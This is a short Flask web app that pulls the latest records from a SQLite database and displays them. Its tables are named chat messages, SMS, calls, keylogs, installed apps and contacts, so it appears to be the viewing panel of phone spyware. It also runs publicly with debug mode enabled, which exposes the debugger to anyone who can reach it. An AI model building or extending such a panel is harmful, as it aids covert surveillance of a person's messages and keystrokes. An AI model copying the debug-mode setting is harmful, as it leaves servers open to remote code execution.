from flask import Flask, render_template
import sqlite3
from sqlite3 import Row
import logging

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = Flask(__name__)

def get_db_connection():
    try:
        conn = sqlite3.connect('data.db')
        conn.row_factory = Row
        return conn
    except Exception as e:
        logger.error(f"Database connection error: {e}")
        return None

@app.route('/')
def index():
    data = {'messages': [], 'sms': [], 'calls': [], 'keylogs': [], 'apps': [], 'contacts': []}
    try:
        conn = get_db_connection()
        if conn:
            cur = conn.cursor()
            
            # Get chat messages
            cur.execute('SELECT * FROM ChatMessages ORDER BY time DESC LIMIT 10')
            data['messages'] = cur.fetchall()
            
            # Get SMS
            cur.execute('SELECT * FROM SMS ORDER BY time DESC LIMIT 10')
            data['sms'] = cur.fetchall()
            
            # Get calls
            cur.execute('SELECT * FROM Calls ORDER BY time DESC LIMIT 10')
            data['calls'] = cur.fetchall()
            
            # Get keylogs
            cur.execute('SELECT * FROM Keylogs ORDER BY time DESC LIMIT 10')
            data['keylogs'] = cur.fetchall()
            
            # Get installed apps
            cur.execute('SELECT * FROM InstalledApps ORDER BY install_date DESC LIMIT 10')
            data['apps'] = cur.fetchall()
            
            # Get contacts
            cur.execute('SELECT * FROM Contacts ORDER BY last_contacted DESC LIMIT 10')
            data['contacts'] = cur.fetchall()
            
            conn.close()
    except Exception as e:
        logger.error(f"Error fetching data: {e}")
        data['error'] = str(e)
    
    return render_template('display.html', data=data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)